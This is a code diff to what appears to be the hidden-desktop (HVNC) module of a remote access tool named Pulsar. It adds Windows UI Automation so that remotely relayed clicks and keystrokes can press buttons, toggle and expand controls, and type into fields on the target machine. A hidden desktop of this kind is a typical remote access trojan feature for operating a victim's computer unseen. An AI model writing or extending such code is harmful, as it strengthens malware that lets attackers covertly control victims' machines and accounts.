@@ -5,6 +5,8 @@ using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Windows;
+using System.Windows.Automation;
 
 namespace Pulsar.Client.Helper.HVNC
 {
@@ -186,6 +188,7 @@ namespace Pulsar.Client.Helper.HVNC
         private const int VK_LMENU = 0xA4; // Left Alt
         private const int VK_RMENU = 0xA5; // Right Alt
         private const int VK_CAPITAL = 0x14; // Caps Lock
+        private const int VK_SPACE = 0x20;
 
         #endregion
 
@@ -203,6 +206,18 @@ namespace Pulsar.Client.Helper.HVNC
         private bool isControlPressed = false;
         private bool isAltPressed = false;
         private bool isCapsLockOn = false;
+
+        private bool automationClickArmed = false;
+        private POINT automationClickScreen;
+        private IntPtr automationClickWindow = IntPtr.Zero;
+        private IntPtr automationClickDownWParam = IntPtr.Zero;
+        private IntPtr automationClickDownLParam = IntPtr.Zero;
+
+        private bool automationEnabled = true;
+        private int automationFailureCount = 0;
+        private DateTime automationRetryAfter = DateTime.MinValue;
+        private const int AUTOMATION_FAILURE_THRESHOLD = 3;
+        private static readonly TimeSpan AUTOMATION_RETRY_BACKOFF = TimeSpan.FromMinutes(1);
 
         /// <summary>
         /// Gets the desktop handle.
@@ -590,6 +605,20 @@ namespace Pulsar.Client.Helper.HVNC
                     bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
                     bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);
 
+                    if (msg == WM_LBUTTONDOWN)
+                    {
+                        if (ShouldHandleWithUIAutomation(x, y, out IntPtr automationTarget))
+                        {
+                            automationClickArmed = true;
+                            automationClickScreen = new POINT { x = x, y = y };
+                            automationClickWindow = automationTarget != IntPtr.Zero ? automationTarget : WindowFromPoint(cursorPosition);
+                            automationClickDownWParam = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
+                            automationClickDownLParam = MakeLParam(cursorPosition.x, cursorPosition.y);
+                            workingWindow = automationClickWindow;
+                            return;
+                        }
+                    }
+
                     if (isMovingWindow && isUp && isLeft)
                     {
                         // If we were moving a window and now released the button, complete the move
@@ -605,6 +634,22 @@ namespace Pulsar.Client.Helper.HVNC
                     // Get the window under the cursor
                     IntPtr hwnd = WindowFromPoint(cursorPosition);
                     workingWindow = hwnd;
+
+                    if (automationClickArmed && msg == WM_LBUTTONUP && hwnd == automationClickWindow)
+                    {
+                        bool handled = TryHandleMouseWithUIAutomation(automationClickScreen.x, automationClickScreen.y, hwnd);
+                        automationClickArmed = false;
+                        automationClickWindow = IntPtr.Zero;
+                        if (handled)
+                        {
+                            return;
+                        }
+
+                        PostMessage(hwnd, WM_LBUTTONDOWN, automationClickDownWParam, automationClickDownLParam);
+                        IntPtr fallbackLParam = MakeLParam(cursorPosition.x, cursorPosition.y);
+                        PostMessage(hwnd, msg, IntPtr.Zero, fallbackLParam);
+                        return;
+                    }
 
                     if (hwnd != IntPtr.Zero)
                     {
@@ -681,12 +726,449 @@ namespace Pulsar.Client.Helper.HVNC
                 // Handle keyboard messages
                 if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                 {
+                    if (TryHandleKeyboardWithUIAutomation(msg, wParam))
+                    {
+                        return;
+                    }
+
                     if (workingWindow != IntPtr.Zero)
                     {
                         HandleKeyboardInput(msg, wParam, lParam, workingWindow);
                     }
                 }
             }
+        }
+
+        #endregion
+
+        #region UI Automation Helpers
+
+        private static bool IsAutomationException(Exception ex)
+        {
+            return ex is ElementNotAvailableException
+                || ex is InvalidOperationException
+                || ex is COMException
+                || ex is ArgumentException;
+        }
+
+        private bool ShouldHandleWithUIAutomation(int screenX, int screenY, out IntPtr targetWindow)
+        {
+            targetWindow = IntPtr.Zero;
+
+            if (!IsAutomationAvailable())
+            {
+                return false;
+            }
+
+            try
+            {
+                AutomationElement element = AutomationElement.FromPoint(new Point(screenX, screenY));
+
+                if (element == null)
+                {
+                    HandleAutomationSkip();
+                    return false;
+                }
+
+                targetWindow = new IntPtr(element.Current.NativeWindowHandle);
+
+                bool supportsActivation = ElementSupportsActivation(element);
+
+                if (!supportsActivation)
+                {
+                    HandleAutomationSkip();
+                }
+
+                return supportsActivation;
+            }
+            catch (Exception ex) when (IsAutomationException(ex))
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+            catch (Exception ex)
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+        }
+
+        private bool TryHandleMouseWithUIAutomation(int screenX, int screenY, IntPtr hwnd)
+        {
+            if (!IsAutomationAvailable())
+            {
+                return false;
+            }
+
+            try
+            {
+                AutomationElement element = AutomationElement.FromPoint(new Point(screenX, screenY));
+
+                if (element == null)
+                {
+                    HandleAutomationSkip();
+                    return false;
+                }
+
+                if (TryInvokeElement(element))
+                {
+                    ResetAutomationFailures();
+                    return true;
+                }
+
+                TreeWalker walker = TreeWalker.ControlViewWalker;
+                AutomationElement parent = walker.GetParent(element);
+
+                while (parent != null)
+                {
+                    if (TryInvokeElement(parent))
+                    {
+                        ResetAutomationFailures();
+                        return true;
+                    }
+
+                    parent = walker.GetParent(parent);
+                }
+
+                HandleAutomationSkip();
+            }
+            catch (Exception ex) when (IsAutomationException(ex))
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+            catch (Exception ex)
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+
+            return false;
+        }
+
+        private bool TryHandleKeyboardWithUIAutomation(uint msg, IntPtr wParam)
+        {
+            if (!IsAutomationAvailable())
+            {
+                return false;
+            }
+
+            try
+            {
+                AutomationElement focused = AutomationElement.FocusedElement;
+
+                if (focused == null)
+                {
+                    HandleAutomationSkip();
+                    return false;
+                }
+
+                if (msg == WM_KEYDOWN)
+                {
+                    int virtualKey = wParam.ToInt32();
+
+                    if (virtualKey == VK_RETURN || virtualKey == VK_SPACE)
+                    {
+                        bool handled = TryInvokeElement(focused);
+                        if (handled)
+                        {
+                            ResetAutomationFailures();
+                        }
+                        else
+                        {
+                            HandleAutomationSkip();
+                        }
+                        return handled;
+                    }
+                }
+                else if (msg == WM_CHAR)
+                {
+                    char ch = (char)wParam.ToInt32();
+                    bool handled = TryApplyCharacterToValuePattern(focused, ch);
+                    if (handled)
+                    {
+                        ResetAutomationFailures();
+                    }
+                    else
+                    {
+                        HandleAutomationSkip();
+                    }
+                    return handled;
+                }
+            }
+            catch (Exception ex) when (IsAutomationException(ex))
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+            catch (Exception ex)
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+
+            return false;
+        }
+
+        private bool TryApplyCharacterToValuePattern(AutomationElement element, char ch)
+        {
+            ValuePattern valuePattern;
+            if (!TryGetPattern(element, ValuePattern.Pattern, out valuePattern))
+            {
+                return false;
+            }
+
+            try
+            {
+                if (valuePattern.Current.IsReadOnly)
+                {
+                    return false;
+                }
+
+                if (ch == '\r' || ch == '\n')
+                {
+                    return TryInvokeElement(element);
+                }
+
+                string currentValue = valuePattern.Current.Value ?? string.Empty;
+
+                if (ch == '\b')
+                {
+                    if (currentValue.Length == 0)
+                    {
+                        return true;
+                    }
+
+                    currentValue = currentValue.Substring(0, currentValue.Length - 1);
+                }
+                else if (!char.IsControl(ch))
+                {
+                    currentValue += ch;
+                }
+                else
+                {
+                    return false;
+                }
+
+                valuePattern.SetValue(currentValue);
+                return true;
+            }
+            catch (Exception ex) when (IsAutomationException(ex))
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+            catch (Exception ex)
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+        }
+
+        private bool ElementSupportsActivation(AutomationElement element)
+        {
+            return ElementSupportsPattern(element, InvokePattern.Pattern) ||
+                   ElementSupportsPattern(element, SelectionItemPattern.Pattern) ||
+                   ElementSupportsPattern(element, TogglePattern.Pattern) ||
+                   ElementSupportsPattern(element, ExpandCollapsePattern.Pattern);
+        }
+
+        private bool ElementSupportsPattern(AutomationElement element, AutomationPattern pattern)
+        {
+            try
+            {
+                object patternObj;
+                bool success = element.TryGetCurrentPattern(pattern, out patternObj) && patternObj != null;
+
+                if (!success)
+                {
+                    HandleAutomationSkip();
+                }
+
+                return success;
+            }
+            catch (Exception ex) when (IsAutomationException(ex))
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+            catch (Exception ex)
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+        }
+
+        private bool TryInvokeElement(AutomationElement element)
+        {
+            if (element == null)
+            {
+                return false;
+            }
+
+            if (TryGetPattern(element, InvokePattern.Pattern, out InvokePattern invokePattern))
+            {
+                try
+                {
+                    invokePattern.Invoke();
+                    ResetAutomationFailures();
+                    return true;
+                }
+                catch (Exception ex) when (IsAutomationException(ex))
+                {
+                    HandleAutomationFailure(ex);
+                }
+                catch (Exception ex)
+                {
+                    HandleAutomationFailure(ex);
+                }
+            }
+
+            if (TryGetPattern(element, SelectionItemPattern.Pattern, out SelectionItemPattern selectionPattern))
+            {
+                try
+                {
+                    selectionPattern.Select();
+                    ResetAutomationFailures();
+                    return true;
+                }
+                catch (Exception ex) when (IsAutomationException(ex))
+                {
+                    HandleAutomationFailure(ex);
+                }
+                catch (Exception ex)
+                {
+                    HandleAutomationFailure(ex);
+                }
+            }
+
+            if (TryGetPattern(element, TogglePattern.Pattern, out TogglePattern togglePattern))
+            {
+                try
+                {
+                    togglePattern.Toggle();
+                    ResetAutomationFailures();
+                    return true;
+                }
+                catch (Exception ex) when (IsAutomationException(ex))
+                {
+                    HandleAutomationFailure(ex);
+                }
+                catch (Exception ex)
+                {
+                    HandleAutomationFailure(ex);
+                }
+            }
+
+            if (TryGetPattern(element, ExpandCollapsePattern.Pattern, out ExpandCollapsePattern expandCollapsePattern))
+            {
+                try
+                {
+                    var state = expandCollapsePattern.Current.ExpandCollapseState;
+
+                    switch (state)
+                    {
+                        case ExpandCollapseState.Collapsed:
+                        case ExpandCollapseState.PartiallyExpanded:
+                            expandCollapsePattern.Expand();
+                            break;
+                        case ExpandCollapseState.Expanded:
+                            expandCollapsePattern.Collapse();
+                            break;
+                    }
+
+                    ResetAutomationFailures();
+                    return true;
+                }
+                catch (Exception ex) when (IsAutomationException(ex))
+                {
+                    HandleAutomationFailure(ex);
+                }
+                catch (Exception ex)
+                {
+                    HandleAutomationFailure(ex);
+                }
+            }
+
+            return false;
+        }
+
+        private bool TryGetPattern<TPattern>(AutomationElement element, AutomationPattern pattern, out TPattern typedPattern) where TPattern : class
+        {
+            typedPattern = null;
+
+            try
+            {
+                object patternObj;
+                if (!element.TryGetCurrentPattern(pattern, out patternObj) || patternObj == null)
+                {
+                    HandleAutomationSkip();
+                    return false;
+                }
+
+                typedPattern = patternObj as TPattern;
+                if (typedPattern == null)
+                {
+                    HandleAutomationSkip();
+                }
+                return typedPattern != null;
+            }
+            catch (Exception ex) when (IsAutomationException(ex))
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+            catch (Exception ex)
+            {
+                HandleAutomationFailure(ex);
+                return false;
+            }
+        }
+
+        private bool IsAutomationAvailable()
+        {
+            if (!automationEnabled && DateTime.UtcNow >= automationRetryAfter)
+            {
+                automationEnabled = true;
+                automationFailureCount = 0;
+            }
+
+            return automationEnabled;
+        }
+
+        private void HandleAutomationFailure(Exception ex)
+        {
+            if (!automationEnabled)
+            {
+                return;
+            }
+
+            automationFailureCount++;
+            Debug.WriteLine($"UIA disabled attempt #{automationFailureCount}: {ex.Message}");
+
+            if (automationFailureCount >= AUTOMATION_FAILURE_THRESHOLD)
+            {
+                automationEnabled = false;
+                automationRetryAfter = DateTime.UtcNow + AUTOMATION_RETRY_BACKOFF;
+                Debug.WriteLine("UIA interactions disabled temporarily due to repeated failures.");
+            }
+        }
+
+        private void HandleAutomationSkip()
+        {
+            if (!automationEnabled)
+            {
+                return;
+            }
+
+            automationFailureCount = Math.Max(automationFailureCount - 1, 0);
+        }
+
+        private void ResetAutomationFailures()
+        {
+            automationFailureCount = 0;
+            automationEnabled = true;
+            automationRetryAfter = DateTime.MinValue;
         }
 
         #endregion
